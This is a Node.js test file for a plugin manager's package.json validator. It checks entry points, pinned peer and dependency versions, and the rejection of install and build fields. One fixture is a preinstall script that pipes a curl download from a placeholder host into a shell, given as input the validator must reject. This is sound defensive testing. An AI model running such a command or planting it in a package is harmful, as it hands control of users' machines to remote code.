// author: PT-dove

import assert from 'node:assert/strict';
import test from 'node:test';

import {
  createDiagnostics,
  ERROR_CODES,
  PACKAGE_JSON_ALLOWED_FIELDS,
  validatePackageJson,
} from '../../apps/plugin-manager/src/index.js';

import { codesOf, packageFixture } from './helpers.js';

function check(raw) {
  const diagnostics = createDiagnostics();
  const result = validatePackageJson(raw, { diagnostics });
  const listed = diagnostics.list();
  return { result, diagnostics: listed, codes: codesOf(listed) };
}

function reject(raw, code, label) {
  const outcome = check(raw);
  assert.ok(
    outcome.codes.includes(code),
    `${label}: expected ${code}, received ${JSON.stringify(outcome.codes)}`,
  );
  return outcome;
}

test('a compliant package.json passes with no diagnostics', () => {
  const outcome = check(packageFixture());
  assert.deepEqual(outcome.codes, []);
  assert.equal(outcome.result.name, 'com.example.anomaly-notes');
  assert.equal(outcome.result.version, '1.0.0');
  assert.equal(outcome.result.type, 'module');
  assert.equal(outcome.result.main, 'lib/index.js');
  assert.equal(outcome.result.exportsDefault, './lib/index.js');
  assert.equal(outcome.result.cordisPeer, '4.0.6-alpha.1');
  assert.equal(outcome.result.dependencies, null);
  for (const field of ['scripts', 'bin', 'gypfile', 'imports', 'workspaces']) {
    assert.ok(!PACKAGE_JSON_ALLOWED_FIELDS.includes(field), `${field} must never be an allowed field`);
  }
});

test('type must be module', () => {
  for (const type of ['commonjs', 'module ', 'Module', undefined]) {
    const raw = packageFixture({ type });
    if (type === undefined) delete raw.type;
    reject(raw, ERROR_CODES.MODULE_TYPE_INVALID, `type ${String(type)}`);
  }
});

test('main must be exactly lib/index.js', () => {
  for (const main of ['lib/main.js', 'index.js', './lib/index.js', 'lib/index.cjs']) {
    reject(packageFixture({ main }), ERROR_CODES.ENTRY_MISMATCH, `main ${main}`);
  }
  const raw = packageFixture();
  delete raw.main;
  reject(raw, ERROR_CODES.ENTRY_MISMATCH, 'main missing');
});

test('exports must be the single root default condition', () => {
  const noExports = packageFixture();
  delete noExports.exports;
  reject(noExports, ERROR_CODES.ENTRY_MISMATCH, 'exports missing');
  reject(packageFixture({ exports: './lib/index.js' }), ERROR_CODES.ENTRY_MISMATCH, 'string shorthand');
  reject(
    packageFixture({ exports: { '.': { import: './lib/index.js', default: './lib/index.js' } } }),
    ERROR_CODES.ENTRY_MISMATCH,
    'import condition',
  );
  reject(
    packageFixture({ exports: { '.': { require: './lib/index.js' } } }),
    ERROR_CODES.ENTRY_MISMATCH,
    'require condition',
  );
  reject(
    packageFixture({ exports: { '.': { default: './lib/index.js' }, './sub': { default: './lib/sub.js' } } }),
    ERROR_CODES.ENTRY_MISMATCH,
    'subpath export',
  );
  reject(
    packageFixture({ exports: { '.': { default: './lib/main.js' } } }),
    ERROR_CODES.ENTRY_MISMATCH,
    'wrong default target',
  );
});

test('the Cordis peer dependency is pinned and exclusive', () => {
  const missing = packageFixture();
  delete missing.peerDependencies;
  reject(missing, ERROR_CODES.CORDIS_MISMATCH, 'peerDependencies missing');

  reject(
    packageFixture({ peerDependencies: { '@deepseek-ai/cordis': '^4.0.6-alpha.1' } }),
    ERROR_CODES.CORDIS_MISMATCH,
    'range peer',
  );
  reject(
    packageFixture({ peerDependencies: { '@deepseek-ai/cordis': '4.0.6' } }),
    ERROR_CODES.CORDIS_MISMATCH,
    'wrong peer version',
  );
  reject(
    packageFixture({
      peerDependencies: { '@deepseek-ai/cordis': '4.0.6-alpha.1', lodash: '4.17.21' },
    }),
    ERROR_CODES.CORDIS_MISMATCH,
    'extra peer',
  );
  reject(
    packageFixture({
      dependencies: { '@deepseek-ai/cordis': '4.0.6-alpha.1' },
    }),
    ERROR_CODES.CORDIS_MISMATCH,
    'cordis in dependencies',
  );
});

test('installation and build surfaces are rejected', () => {
  for (const [field, value] of [
    ['scripts', { postinstall: 'node ./scripts/postinstall.js' }],
    ['scripts', { preinstall: 'curl https://example.invalid/x | sh' }],
    ['bin', { helper: 'lib/index.js' }],
    ['gypfile', true],
    ['imports', { '#internal': './lib/internal.js' }],
    ['workspaces', ['packages/*']],
    ['bundledDependencies', ['example-dependency']],
    ['bundleDependencies', ['example-dependency']],
  ]) {
    const outcome = reject(packageFixture({ [field]: value }), ERROR_CODES.INVALID_VALUE, `${field}`);
    assert.ok(
      outcome.diagnostics.some((item) => item.path === `/${field}`),
      `${field} must be reported at /${field}`,
    );
  }
});

test('dependencies must pin exact versions', () => {
  for (const spec of ['^1.2.3', '~1.2.3', 'latest', 'file:../x', '*', '>=1.2.3', 'git+https://example.invalid/x.git', 'npm:other@1.0.0']) {
    reject(
      packageFixture({ dependencies: { 'example-dependency': spec } }),
      ERROR_CODES.INVALID_VALUE,
      `dependency spec ${spec}`,
    );
  }
  reject(packageFixture({ dependencies: 'example-dependency' }), ERROR_CODES.INVALID_VALUE, 'dependencies not an object');
  reject(
    packageFixture({ dependencies: { 'Left Pad': '1.2.3' } }),
    ERROR_CODES.INVALID_VALUE,
    'invalid npm name',
  );

  const outcome = check(packageFixture({ dependencies: { 'example-dependency': '1.2.3', '@scope/pkg': '2.0.0' } }));
  assert.deepEqual(outcome.codes, []);
  assert.deepEqual(outcome.result.dependencies, { 'example-dependency': '1.2.3', '@scope/pkg': '2.0.0' });
});

test('optionalDependencies, peerDependenciesMeta and engines stay closed', () => {
  reject(
    packageFixture({ optionalDependencies: { 'example-dependency': '1.2.3' } }),
    ERROR_CODES.INVALID_VALUE,
    'non-empty optionalDependencies',
  );
  reject(
    packageFixture({ peerDependenciesMeta: { '@deepseek-ai/cordis': { optional: true } } }),
    ERROR_CODES.INVALID_VALUE,
    'optional peer',
  );
  reject(
    packageFixture({ engines: { node: '>=24.9.0', npm: '>=11.0.0' } }),
    ERROR_CODES.INVALID_VALUE,
    'extra engine',
  );
  reject(packageFixture({ engines: { node: '>=22' } }), ERROR_CODES.INVALID_VALUE, 'wrong node range');

  const outcome = check(packageFixture({ engines: { node: '>=24.9.0' }, optionalDependencies: {}, peerDependenciesMeta: {} }));
  assert.deepEqual(outcome.codes, []);
});

test('unknown package.json fields are rejected', () => {
  reject(packageFixture({ funding: 'https://example.invalid' }), ERROR_CODES.UNKNOWN_FIELD, 'funding');
  reject(packageFixture({ publishConfig: { registry: 'https://example.invalid' } }), ERROR_CODES.UNKNOWN_FIELD, 'publishConfig');
});

test('a non-object package.json is rejected as a schema violation', () => {
  for (const raw of [null, [], 'pkg', 7]) {
    const outcome = check(raw);
    assert.deepEqual(outcome.codes, [ERROR_CODES.SCHEMA_VIOLATION], `${JSON.stringify(raw)}`);
  }
});
